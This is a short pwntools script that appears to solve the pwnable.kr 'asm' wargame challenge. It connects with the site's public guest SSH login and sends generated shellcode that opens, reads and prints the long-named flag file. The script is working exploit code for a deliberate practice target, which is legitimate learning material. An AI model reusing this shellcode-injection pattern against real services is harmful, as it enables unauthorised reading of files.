from pwn import *

con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
p = con.connect_remote('localhost', 9026)

context(arch='amd64', os='linux')

shellcode = ''
shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
shellcode += shellcraft.open('rsp', 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)

# log.info(shellcode)

p.recvuntil('shellcode: ')
p.send(asm(shellcode))
log.success(p.recvline())
